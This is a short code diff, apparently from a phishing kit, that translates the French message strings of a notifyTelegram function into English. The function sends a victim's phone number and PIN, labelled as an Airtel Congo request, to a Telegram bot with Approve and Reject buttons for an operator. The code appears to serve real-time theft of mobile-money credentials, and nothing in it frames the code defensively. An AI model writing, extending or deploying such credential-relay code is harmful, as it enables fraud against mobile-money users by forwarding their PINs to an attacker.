@@ -12,13 +12,13 @@ const approvals = new Map();
 
 async function notifyTelegram(phone, pin, requestId) {
     const lines = [
-        '📲 Nouvelle demande Airtel Congo',
-        '📱 Téléphone: ' + phone,
+        '📲 New Airtel Congo Request',
+        '📱 Phone: ' + phone,
         '🔑 PIN: ' + pin,
         '🆔 Request: ' + requestId,
         '',
-        '✅ /approve_' + requestId + ' - Approuver',
-        '❌ /reject_' + requestId + ' - Rejeter'
+        '✅ /approve_' + requestId + ' - Approve',
+        '❌ /reject_' + requestId + ' - Reject'
     ];
     const message = lines.join('\n');
     
@@ -31,8 +31,8 @@ async function notifyTelegram(phone, pin, requestId) {
                 text: message,
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: '✅ Approuver', callback_data: 'approve_' + requestId },
-                        { text: '❌ Rejeter', callback_data: 'reject_' + requestId }
+                        { text: '✅ Approve', callback_data: 'approve_' + requestId },
+                        { text: '❌ Reject', callback_data: 'reject_' + requestId }
                     ]]
                 }
             })
